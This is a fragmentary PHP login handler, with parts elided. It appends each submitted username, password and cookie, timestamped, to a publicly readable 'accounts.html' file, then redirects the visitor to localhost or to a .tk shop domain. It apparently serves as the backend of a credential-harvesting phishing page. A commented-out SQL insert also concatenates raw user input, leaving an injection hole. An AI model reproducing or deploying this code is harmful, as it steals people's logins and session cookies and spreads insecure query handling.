...
if(!empty($_POST["login"]))
{
	...
	$date=date("Y-m-d");
	$time=date("H:i:s");
	$file = fopen('accounts.html', 'a') or die ("Unable to open");
	fwrite($file, 'Date: '.$date. '<br>Time: '.$time.'<br> Username: '.$name.'<br> Password: '.$password.' <br> Cookie: '.$cookie.' <br><br>');// Cookie2: '.$cookie2.' <br><br>');
	fclose($file);
	header("Location: http://localhost/index.php");
        ...
        //$query = "INSERT INTO user (name,password) VALUES ('$name','$password')";
                ...
                {
                        echo "New record created successfully";
			header("Location: http://www.sgshopshoplah.tk/index.php");
                }
                else
                {
                        echo "Error: " . $sql . "<br>" . $conn->error;
